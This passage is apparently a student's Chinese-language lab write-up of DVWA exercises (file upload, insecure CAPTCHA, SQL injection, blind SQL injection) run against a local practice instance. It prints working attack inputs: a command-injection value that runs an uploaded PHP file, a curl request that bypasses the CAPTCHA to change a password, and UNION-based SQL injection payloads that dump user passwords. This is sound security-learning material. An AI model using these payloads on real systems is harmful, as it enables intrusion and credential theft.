src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2041.png"/></a></figure><h1 id="71e0bdf1-dacc-431d-8d6a-e1d974a47791" class="">5. File Upload</h1><h3 id="568188c6-0c86-4929-ad23-97badd6a3bfb" class="">Objective: Execute any PHP function of your choosing on the target system (such as <a href="https://secure.php.net/manual/en/function.phpinfo.php">phpinfo()</a> or <a href="https://secure.php.net/manual/en/function.system.php">system()</a>) thanks to this file upload vulnerability.</h3><p id="1f1ecf36-67a7-417a-8a46-185e867878d3" class="">
+</p><p id="42e1a8b3-a4c7-4e38-b22a-9d5ac5224ea1" class="">基本上如果可以上傳並執行任意檔案，就可以做很多事</p><p id="14735d66-b150-485a-a0db-04b2b4f4901a" class="">OWASP 的文件整理得蠻詳細的，有提到上傳檔案也有不同的延伸應用和變化，例如壓縮後上傳以避免掃描或者塞爆硬碟空間之類的作法 XD</p><h2 id="b68887c5-7102-4a63-9a0c-3254eaa8393a" class="">觀察</h2><h3 id="56bdd3f5-01fe-4d10-a9b3-aa4e3ca38183" class="">可以先測試檔案的型態, 大小, 格式 等限制</h3><figure id="a239c7b1-c5a0-4fa7-8b8a-5f518b9442ea" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2042.png"><img style="width:576px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2042.png"/></a></figure><figure id="5531b227-d686-43fb-87f3-281539f4bf32" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2043.png"><img style="width:1636px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2043.png"/></a></figure><h3 id="6d665eaa-d01b-4916-8e89-3a441ad60d91" class="">留意上傳檔案的位置，因為這代表我們有機會執行這個路徑上的檔案</h3><p id="123c672b-4b83-4b92-b156-b85772cc78e8" class="">試著上傳惡意檔案</p><p id="ef888d6c-11b0-43ca-9815-6747f7bef7f2" class="">這是目前頁面的路徑，可以看到檔案上傳的位置是在上上層</p><pre id="8a4c9705-4e62-4bc2-8022-e950d9e22158" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/upload/</code></pre><figure id="4b826150-141e-4c7a-adca-afe8e5680a31" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2044.png"><img style="width:1084px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2044.png"/></a></figure><p id="48f6ca93-6522-4dac-8dc4-0ae8273e6e23" class="">
+</p><pre id="ce8c31b4-58f8-4298-8ac8-f7e82774e490" class="code code-wrap"><code>http://localhost:8086/hackable/uploads/yo.php</code></pre><figure id="dae2c94c-a71f-4dd0-b769-d8ed6809c441" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2045.png"><img style="width:1010px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2045.png"/></a></figure><p id="baf05f9c-f467-4da9-a7fd-ddc36ac56a79" class="">
+</p><h3 id="d15600dc-1354-4b4f-99c3-74730052687e" class="">✨Done✨</h3><p id="e4576b31-c51b-4cdc-ba58-81cd6ce77a59" class="">將檔案內容換成 <code>phpinfo()</code></p><figure id="dec1c84d-2964-4b75-ad4e-f39611f1b0d5" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2046.png"><img style="width:2118px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2046.png"/></a></figure><p id="aa9d7f05-d585-4c87-8b28-9350974b19c6" class="">
+</p><h2 id="4123bb58-ab89-492e-8201-1b533864376c" class="">memo</h2><h3 id="d92184df-2762-48a2-bd2b-09e0e220432b" class="">可以跟 Command injection 混搭測試，執行上傳的惡意檔案</h3><div id="1c0fa76e-9fc5-47f1-bce6-889c24a1a7f7" class="column-list"><div id="e96250b8-c1e3-408b-b012-fdb01c668ff4" style="width:43.75%" class="column"><figure id="df359350-55e6-4c85-aae2-d478a63a4e60" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2047.png"><img style="width:432px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2047.png"/></a></figure></div><div id="d2c31dbf-b9d4-4b5e-be97-ce0d08988b77" style="width:56.25%" class="column"><figure id="dc5b372e-7a82-4ae8-b605-01c78045e695" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2048.png"><img style="width:1006px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2048.png"/></a></figure></div></div><pre id="35f71f5e-49e4-4968-a098-50fe003d3f7f" class="code code-wrap"><code>;php /var/www/html/hackable/uploads/yo.php</code></pre><figure id="badf3f13-bb25-41c2-bf82-d0015dbf0abe" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2049.png"><img style="width:988px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2049.png"/></a></figure><p id="21cf64e1-11da-4027-8bcc-42fa70061dbb" class="">
+</p><hr id="161c48a3-b5c0-4133-8382-fda40dcd7e24"/><h1 id="80a29f5d-7fd5-4c84-a2fa-a5b55e10a12e" class="">6. Insecure CAPTCHA</h1><h3 id="b503e026-be1d-473d-9f77-3c49bd235682" class="">Objective: Your aim, change the current user&#x27;s password in an automated manner because of the poor CAPTCHA system.</h3><p id="0da49b27-31d0-4cef-8cc0-1117e5a8bf4c" class="">
+</p><p id="fa0c7f57-af80-4f38-9399-13987ae2a6ae" class="">根據參考資料， CAPTCHA 應該被視為用來 limit request rate</p><h3 id="ee512d8b-7a67-4d9d-a893-b4a5a6a1ce48" class="">觀察</h3><p id="04c3118d-deda-4696-b54e-38ef048c9f71" class="">不勾選驗證會無法通關</p><figure id="cb9412da-1268-4986-941f-2d5eace803ac" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2050.png"><img style="width:480px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2050.png"/></a></figure><p id="fb1095f8-44af-4c77-9d70-e401fb842834" class="">
+</p><p id="b4440d04-62fa-4b02-b24a-d357da3ab9b8" class="">看起來目前這個頁面和 CAPTCHA 的整合應該就只有靠前端</p><figure id="8c6e74b3-6e69-45e9-bba1-0382691e71b5" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2051.png"><img style="width:1842px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2051.png"/></a></figure><h3 id="3b4ec943-297c-4da9-9bd7-e6840f1e5e78" class="">試著 bypass 驗證</h3><p id="1ccd0e3e-800e-44c8-836e-6d364e3501d9" class="">第一個念頭是關閉 javascript 再送出表單 XD</p><figure id="0a00f67b-4958-4fee-8d2a-23830902d5b2" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2052.png"><img style="width:404px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2052.png"/></a></figure><p id="942da799-5446-438d-a978-5399aa3adf3f" class="">依然無法 QQ，還是會有紅字</p><div id="7d7019b9-e438-446b-baa1-6e914e4147c7" class="column-list"><div id="890a037e-c0e5-44b5-8ca5-22bf8afda4de" style="width:50%" class="column"><figure id="4433539a-1126-4a82-b0c0-a738e2d3bd19" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2053.png"><img style="width:384px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2053.png"/></a></figure></div><div id="368ce78b-4859-480f-ae1a-1f6f2f56df23" style="width:50%" class="column"><figure id="2fb2b2d9-c985-4953-877e-592d603eeccc" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2054.png"><img style="width:384px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2054.png"/></a></figure></div></div><p id="8f1f94b5-39c0-4676-b107-b32e9c1cfb72" class="">好吧 看起來並不單純</p><figure id="d22b4612-8b21-4fbd-99c4-1ebbdd58556d" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2055.png"><img style="width:2648px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2055.png"/></a></figure><h3 id="74739a6f-99c8-4b3b-9dac-d02ace73629e" class="">跳過驗證，直接送 POST</h3><p id="ca18004f-7991-42e7-b216-d368bb8a52a9" class="">再觀察看看表單送出的內容，有個 <code>step</code> key (要記得保持 javascript 關閉的狀態，才能觀察到 POST request，方便接下來修改 request)</p><figure id="d1147af2-2b41-45da-bed4-37e2c5307598" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2056.png"><img style="width:1097px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2056.png"/></a></figure><p id="b011e195-099d-4a82-90f8-e647e7380b8e" class="">一樣用老招  XD</p><figure id="52eb7f6c-8cc1-4b58-82b3-c04a6d854c95" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2057.png"><img style="width:528px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2057.png"/></a></figure><figure id="a079daa9-5f36-48d9-883f-22f0a997f921" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2058.png"><img style="width:1138px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2058.png"/></a></figure><p id="ef1c18b1-6c9a-423c-aa2c-d6fc30f71610" class="">
+</p><p id="348ca854-95ce-4723-9e50-43cc8c78bd98" class="">失敗 QQ</p><figure id="a3af8760-d0fb-48bf-bb1d-0828af8a3c0e" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2059.png"><img style="width:288px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2059.png"/></a></figure><p id="f6cdabd2-83f7-4a7e-896b-e34b2fbf448c" class="">
+</p><p id="65ae3538-3749-4211-bded-7a3132e7d2e6" class="">
+</p><p id="e1b78f03-19ad-4a29-9de2-a45dbbe96c93" class="">試著將 step 改成 2 ，然後填入新密碼再送出</p><pre id="df99719b-35d9-4f4d-b189-fb6d0315e2b2" class="code code-wrap"><code>step=2&amp;password_new=222&amp;password_conf=222&amp;Change=Change</code></pre><pre id="15b4c208-ca94-44f3-8253-390646e55797" class="code code-wrap"><code>curl &#x27;http://dvwa.localtest:8086/vulnerabilities/captcha/#&#x27; -X POST -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0&#x27; -H &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27; -H &#x27;Accept-Language: zh-TW,zh;q=0.8,en;q=0.5,en-US;q=0.3&#x27; -H &#x27;Accept-Encoding: gzip, deflate&#x27; -H &#x27;Referer: http://dvwa.localtest:8086/vulnerabilities/captcha/&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -H &#x27;Origin: http://dvwa.localtest:8086&#x27; -H &#x27;DNT: 1&#x27; -H &#x27;Connection: keep-alive&#x27; -H &#x27;Cookie: PHPSESSID=ov64qqshkod7693old2kdk59e3; security=low&#x27; -H &#x27;Upgrade-Insecure-Requests: 1&#x27; -H &#x27;Pragma: no-cache&#x27; -H &#x27;Cache-Control: no-cache&#x27; --data-raw &#x27;step=2&amp;password_new=222&amp;password_conf=222&amp;Change=Change&#x27;</code></pre><p id="de4e7eba-40e7-4769-bb83-f96f9269f991" class="">
+</p><p id="ca07d2c9-d363-45c7-bec5-fbef056a6c95" class="">重登</p><figure id="888edb93-7faf-469d-b7a1-435f98e625d1" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2060.png"><img style="width:336px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2060.png"/></a></figure><h3 id="c1001744-6c29-4243-b00b-88cca57af9fb" class="">✨Done✨</h3><figure id="173fcf05-5ad0-4bb7-8030-3fdb01a1c7a2" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2061.png"><img style="width:2052px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2061.png"/></a></figure><p id="0a3c040c-2b1b-4db5-a2db-aa8fcb719998" class="">
+</p><h2 id="41f83013-8b6d-4fd0-b71b-c6ebc3447415" class="">心得</h2><h3 id="a3897bae-a63f-4b5a-81f2-53ee14cde1c1" class="">1. 先關閉 javascript</h3><h3 id="4c702716-6c10-46a0-bf8a-1d94dc6304bb" class="">2. 再直接送出 POST (不透過表單)</h3><p id="eed3d34a-18a8-41d9-89a4-bd9fe6ce39fe" class="">
+</p><hr id="6acd2060-e62a-4b73-a905-33a807efdd3a"/><h1 id="773b9bf8-c13a-4248-9c21-d3b305b08d58" class="">7. SQL Injection</h1><p id="f441fd9d-8758-4f09-9a90-5e7e74c79651" class="">
+</p><h3 id="fff7080d-15fb-4efd-bd12-a85c82d2e5c7" class="">觀察</h3><p id="9ac225e7-7a94-4b3f-8bb2-cb1a56dd9ba9" class="">先隨便 try try </p><figure id="f64e082f-4bb1-4b6a-b2b8-55a1f358bd05" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2062.png"><img style="width:576px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2062.png"/></a></figure><p id="bb66eb5c-cd45-404a-b537-00950e3b2c19" class="">可以發現 URL query string 有可以下手的地方</p><pre id="bc068d78-8a3c-4d53-a0a6-0dd9cd698c87" class="code code-wrap"><code>http://dvwa.localtest:8086/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</code></pre><p id="b62e718f-e263-4ba4-ae73-7d4bab7dc820" class="">
+</p><h3 id="d3c0dda0-310d-422b-a80d-d4f759d1985a" class="">測試及觀察錯誤訊息</h3><p id="eba9e85b-7224-497f-8e7c-cea6d218f6c6" class="">
+</p><p id="1e98189b-73a8-460d-aec4-9c2aabf14a00" class="">id 第一個數字後面不管接什麼都可以 pass，可能代表 SQL 已經被結尾?</p><pre id="83a14bb8-dd7a-4d2c-9db0-69402581b42f" class="code code-wrap"><code>1zxw1--;</code></pre><pre id="d7d7c287-8ca3-45b3-b63d-b8c762e0ccc1" class="code code-wrap"><code>http://dvwa.localtest:8086/vulnerabilities/sqli/?id=1zxw1--;&amp;Submit=Submit#</code></pre><div id="09512f81-9842-4bde-bcf3-d653a623f4fa" class="column-list"><div id="ff3772a5-a1b9-45f7-b475-a904496feb87" style="width:50%" class="column"><figure id="00500fcf-1684-47a8-9766-036801fd5cbf" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2063.png"><img style="width:576px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2063.png"/></a></figure><p id="e1b6c2ff-41ec-43d7-b451-15299a5c4afb" class="">
+</p></div><div id="caa9d00e-216c-4774-b69c-5b18118d6c51" style="width:50%" class="column"><figure id="86d1e8b8-6f20-4b4d-9474-decbfc13fbce" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2064.png"><img style="width:1052px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2064.png"/></a></figure></div></div><pre id="603766c7-2bea-4ec1-8262-0519c06629a6" class="code code-wrap"><code>03</code></pre><figure id="a8b22b46-8f57-47f1-a90f-300b828669dd" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2065.png"><img style="width:528px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2065.png"/></a></figure><pre id="28e0db07-b4be-4d3c-92d9-860c1b361f25" class="code code-wrap"><code>0003</code></pre><figure id="d7eebe38-7415-43a8-9b73-563d482714d7" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2066.png"><img style="width:528px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2066.png"/></a></figure><p id="8f305277-8b6c-4e58-8ed7-d5164e2a2bfd" class="">代表它可能對 <code>GET[’id’]</code> 做了一些簡單的轉換處理 ?</p><p id="6cfcc286-3548-48e3-a803-e331e9979cd7" class="">
+</p><p id="3bca31ee-fac1-4c90-a6af-cc32e6861fe3" class="">
+</p><p id="03020bbc-6236-47fb-acf1-dc214ec8af1f" class="">試著加上 single quotes，看看會有什麼反應</p><pre id="e9923339-df6a-416f-ae11-15268d4bcfad" class="code code-wrap"><code>&#x27;1&#x27;</code></pre><pre id="faa405c0-ec2b-48c5-a39a-f598e298a8fb" class="code code-wrap"><code>http://dvwa.localtest:8086/vulnerabilities/sqli/?id=%271%27&amp;Submit=Submit#</code></pre><figure id="8eb3053a-e001-4403-b195-cb432d9a0a77" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2067.png"><img style="width:1539px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2067.png"/></a></figure><pre id="8843256c-7b96-48f4-ba54-1d2520b0f42e" class="code code-wrap"><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;1&#x27;&#x27;&#x27; at line 1</code></pre><p id="c6b4e45a-f264-468d-9843-bbdd56636e58" class="">從這邊可以觀察出 SQL 會自動幫我們補上哪些 single quote，為了更方便觀察，使用其他符號看看</p><p id="dae11fba-7298-47a1-9cf7-fac71ea4291c" class="">
+</p><pre id="3756b6ae-e519-428f-bd1f-aed08ac0f57c" class="code code-wrap"><code>&#x27;1@</code></pre><pre id="1802eb76-2411-4a70-84d9-d9e1dc7a2203" class="code code-wrap"><code>http://dvwa.localtest:8086/vulnerabilities/sqli/?id=%271@&amp;Submit=Submit#</code></pre><pre id="4685dfa2-9af6-48c8-8303-6379c0c4e0e1" class="code code-wrap"><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;1@&#x27;&#x27; at line 1</code></pre><p id="9e599dc4-3955-49bd-a1ad-56044972439a" class="">可以看出 <code>@</code> 的位置，代表 id=1 的後面會被補上兩個 <code>&#x27;</code> </p><p id="b4e239d9-03f6-4862-b086-eac21fcca8d5" class="">
+</p><p id="8d139e98-1db3-4f1d-ad98-4738570b4201" class="">
+</p><p id="ee117777-7698-4f59-a641-f4344cba67d1" class="">我們可以在 &#x27;1@&#x27; 後面的位置繼續補上 OR ‘1’=’1，讓它行成 ‘1’ = ‘1’</p><div id="94c54b1c-0c50-4b36-b072-13687a202b53" class="column-list"><div id="08fed4a1-9d46-477f-b16b-ac305caef641" style="width:68.75%" class="column"><pre id="bff306e2-c18f-425b-8cb9-ed2912b39946" class="code code-wrap"><code>3&#x27; OR &#x27;1&#x27;=&#x27;1</code></pre><pre id="682417ec-98f3-40fc-aa07-41bcfea018fd" class="code code-wrap"><code>http://dvwa.localtest:8086/vulnerabilities/sqli/?id=3%27%20OR%20%271%27=%271&amp;Submit=Submit#</code></pre></div><div id="26ebb552-7837-4586-af60-eac3a6e8832e" style="width:31.250000000000007%" class="column"><figure id="03da02fe-3010-487f-9181-a62f99bd9df8" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2068.png"><img style="width:850px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2068.png"/></a></figure></div></div><p id="2d35a300-999d-4f7a-888c-79ad5ca38a92" class="">
+</p><p id="31784447-8e2b-4223-ac84-ebeb86464cdc" class="">
+</p><div id="0f5bfd1c-dc4a-4752-b86d-986e00acc388" class="column-list"><div id="b9f26f32-b35a-42cf-a807-105aa6cdcf38" style="width:62.5%" class="column"><pre id="4af5b4fe-07f2-4e50-82f8-1a3c596075c9" class="code code-wrap"><code>2&#x27; OR 1=&#x27;1</code></pre><pre id="ad39e84f-bac7-4eb8-8869-b8aad1b09e8d" class="code code-wrap"><code>http://dvwa.localtest:8086/vulnerabilities/sqli/?id=2%27%20OR%20%271%27=%271&amp;Submit=Submit#</code></pre></div><div id="b4bcecbc-a480-4eb8-a15a-d3c3dfb01f19" style="width:37.49999999999999%" class="column"><figure id="810a0bf9-22a7-4844-a341-9d88bee07893" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2069.png"><img style="width:480px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2069.png"/></a></figure></div></div><p id="5c34de31-4ce0-4960-86b4-4158b441fc23" class="">
+</p><p id="7212008a-7066-4bf1-a8de-ea9dacc83e8b" class="">意味著 SQL 會在前後補上 single quote，因此在第一個 id 後面補上 <code>&#x27;</code> ，這樣就可以接著第二組的 OR，第2組的條件結尾故意不加上 <code>&#x27;</code> ，這樣就形成合法的 query 了</p><p id="29df5a01-6e4f-4269-9493-839b457c6a77" class="">
+</p><pre id="2d808066-d5a2-4127-a9a3-d931d53bf4e3" class="code code-wrap"><code>2&#x27; OR 1=&#x27;1 union select * from users;</code></pre><p id="233466b3-efc8-4632-9736-99e1a3aa25bb" class="">
+</p><h2 id="a6365d34-7cbc-493c-8126-191e18808463" class="">取得密碼</h2><p id="49e45a83-78f0-443c-8a75-36e52afd884a" class="">
+</p><h3 id="4c3f2cae-1e83-4602-9b0b-e2925c879e6c" class="">測試 column names</h3><pre id="d3b30c4f-e05b-4c4b-8aaf-cf6e3360c1cd" class="code code-wrap"><code>2&#x27; OR user_id=&#x27;1</code></pre><pre id="0d92e100-c42d-4dc4-a161-c819b4621135" class="code code-wrap"><code># X
+1&#x27; AND sur_name=&#x27;admin </code></pre><pre id="4f6d6e0f-fc73-4960-bf6e-d8a1901a3e9d" class="code code-wrap"><code># first_name column ok
+1&#x27; AND first_name=&#x27;admin </code></pre><pre id="3a482bf5-938d-43a0-aa0f-1d8b4bd5012b" class="code code-wrap"><code># last_name column ok
+1&#x27; AND last_name=&#x27;admin</code></pre><pre id="af8900e1-4fc4-477b-948f-ab8f0634cbdf" class="code code-wrap"><code># password column ok
+1&#x27; AND password&lt;&gt;&#x27;0</code></pre><p id="a6552c52-f07b-464b-8911-e438fe585d24" class="">
+</p><h3 id="a534a8c3-6a0f-4dcc-bd05-d9ddedff2ed9" class="">測試 table name</h3><pre id="453bca70-1e1e-4f0f-a8f6-cb44904a2450" class="code code-wrap"><code>2&#x27; UNION SELECT user_id,user_id FROM user WHERE user_id=&#x27;1</code></pre><pre id="1d435ed5-4612-4af6-b400-7f90f90d6d2b" class="code code-wrap"><code>Table &#x27;dvwa.user&#x27; doesn&#x27;t exist</code></pre><figure id="2aa0e1ab-0242-457d-8b74-c0c322aff431" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2070.png"><img style="width:2234px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2070.png"/></a></figure><p id="29b40b6d-c6b1-48ec-8d5b-61b885604768" class="">
+</p><h3 id="e98015da-7d8a-44e8-96a1-271544c67bfc" class="">show more about tables by query information_schema</h3><pre id="e4927b48-272d-4212-89d4-e16cf4d871ac" class="code code-wrap"><code>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#x27;mysql&#x27; AND table_schema != &#x27;information_schema&#x27;</code></pre><pre id="8abc49a2-254c-46a6-bc59-2787c6165957" class="code code-wrap"><code>0&#x27; UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema !=&#x27;mysql&#x27; AND table_schema !=&#x27;information_schema</code></pre><p id="66ddbd6a-9b7e-42ac-8eef-a047c72ff0a7" class="">
+</p><pre id="49170cc5-6661-4795-9b16-eace696af394" class="code code-wrap"><code># table name is users
+2&#x27; UNION SELECT user_id,user_id FROM users WHERE user_id=&#x27;1</code></pre><figure id="7f9950d5-48d1-4f2a-8e14-eaf187f4812f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2071.png"><img style="width:1572px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2071.png"/></a></figure><p id="8273dce1-8689-4842-b554-31e4f89e232f" class="">
+</p><pre id="12662c99-0601-42a5-839c-ee66d1310b50" class="code code-wrap"><code>2&#x27; UNION SELECT user_id,password FROM users WHERE user_id=&#x27;1</code></pre><figure id="eadffad7-7850-40cd-8123-1cd8365df87a" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2072.png"><img style="width:1638px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2072.png"/></a></figure><p id="7c1a20f7-d41d-4e73-9fc4-cdedace879ab" class="">
+</p><h3 id="cb318cab-0672-4a6a-a882-fa4b9ee676db" class="">✨Done✨</h3><pre id="5c2217d0-31b0-4f2a-9a55-60a7ba1ec766" class="code code-wrap"><code>1&#x27; UNION SELECT first_name,password FROM users WHERE user_id&lt;&gt;&#x27;0</code></pre><pre id="07956b99-a0f6-4733-aa03-2850886817e6" class="code code-wrap"><code>1&#x27; UNION SELECT first_name,password FROM users WHERE user_id &lt;&gt;&#x27;</code></pre><figure id="a4de2fcf-3b39-4453-a817-afa96bd901a7" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2073.png"><img style="width:1642px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2073.png"/></a></figure><p id="44a74bc7-75f7-4b68-9266-f13a3594db32" class="">
+</p><p id="5fb55c3d-4fdd-454a-b72f-111341529b38" class="">
+</p><h3 id="e7dcd85b-6018-4013-a6db-a04ed292441d" class="">心得</h3><p id="09180767-a891-457f-a988-801e198ba103" class="">隨然 wiki 上有標準答案，盡量試著從黑箱角度去推斷原本的 SQL 可能是怎樣寫的，強化理解</p><p id="ffbc6f14-e61d-4f8e-b934-8d56c721be36" class="">
+</p><p id="6b63e1f2-02fe-45d3-8ff3-17ee50a66bce" class="">
+</p><hr id="83d4eae1-ff18-4a22-b91a-6dd2aa1767e6"/><h1 id="422fe114-71e0-4f9a-b914-9cd31bbb06ca" class="">8. SQL Injection (Blind)</h1><h3 id="f83af973-6404-4b75-9155-5498fba5563e" class="">Objective: Find the version of the SQL database software through a blind SQL attack.</h3><p id="bf54bcb2-2cab-4ec6-b56b-d690f799f764" class="">
+</p><p id="7d837577-8ce6-4d01-afd5-403ab57a971b" class="">頁面顯示的資訊有限，只能靠回傳的值是 true or false 來推測你的 query 的正確性</p><pre id="15d95853-05bb-4d4e-aa74-ef116b76b014" class="code code-wrap"><code># User ID exists in the database.
+0&#x27; OR &#x27;1&#x27;=&#x27;1</code></pre><pre id="1a2f9f0d-a9ac-478b-9345-ee9916f0b66a" class="code code-wrap"><code># User ID is MISSING from the database.
+0&#x27; OR &#x27;1&#x27;=&#x27;2</code></pre><p id="2b2455d8-1a9f-47b8-9f6f-814da059193c" class=""><code>‘1’=’2</code> 不成立，所以不管前面那段 (<code>0’ OR</code> ) 是什麼，你都可以靠後面這段來判斷你的猜測是否正確</p><p id="8db38d5a-3aca-4bfe-9895-fca7b545c25d" class="">
+</p><pre id="26ed5d28-17f7-4326-ac23-48957acdad28" class="code code-wrap"><code>2&#x27; OR user_id=&#x27;1</code></pre><figure id="cdb899eb-a036-4838-9790-3cb96bc3a62f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2074.png"><img style="width:1286px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2074.png"/></a></figure><p id="0830cfaf-cb28-45de-a325-7ddcd4c34dad" class="">
+</p><p id="113da314-f148-4d3f-bebe-cc0a278b4b70" class="">
+</p><pre id="937ebd67-f23a-4596-a5dc-a94bda241336" class="code code-wrap"><code>1&#x27; UNION SELECT VERSIONS()&#x27;</code></pre><p id="2923d962-64d6-485c-b242-06499276415b" class="">
+</p><p id="9207e4ad-e859-45a0-9ca8-12ed2475e3bd" class="">參考看看找其他環境的 mariadb 版本長什麼樣子</p><pre id="741ad46b-59c3-4e1f-9849-e47873ece830" class="code code-wrap"><code>select @@version;</code></pre><p id="39c07694-6f2a-4ca9-b128-349b442354a2" class="">
+</p><pre id="03ed2852-a3ef-463d-b657-dc1086a6aef5" class="code code-wrap"><code>select VERSION();</code></pre><figure id="796377be-8b76-425b-b5ed-90be3fe35bb8" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2075.png"><img style="width:421px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2075.png"/></a></figure><figure id="02ca4ae8-bed5-4656-a7ae-99f35567745d" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2076.png"><img style="width:576px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2076.png"/></a><figcaption>參考 google</figcaption></figure><p id="6eefe462-9f26-4ab0-a57b-009d8d3f49bc" class="">
+</p><p id="17a93b51-6f33-4a37-bb5c-784caf3b1fc3" class="">
+</p><pre id="a91b27b0-8323-4ad7-acd3-1656961d82dd" class="code code-wrap"><code>0&#x27; UNION SELECT first_name,password FROM users WHERE user_id &lt;&gt;&#x27;</code></pre><pre id="5cf33727-ee43-4f68-97af-723337493157" class="code code-wrap"><code>0&#x27; UNION SELECT first_name,password FROM users WHERE user_id &lt;&gt;&#x27;</code></pre><p id="b79d4706-a53f-4761-9e15-6e5192b9d170" class="">
+</p><p id="077b07fb-8d46-4d46-8a49-fde94804d1b2" class="">
+</p><pre id="63206a5b-01ce-478f-ba1d-8d487cd2a0ce" class="code"><code>SELECT SUBSTRING((select @@version), 5, 3) AS ExtractString;</code></pre><p id="96045a79-c988-43a1-8e68-890c36399be7" class="">
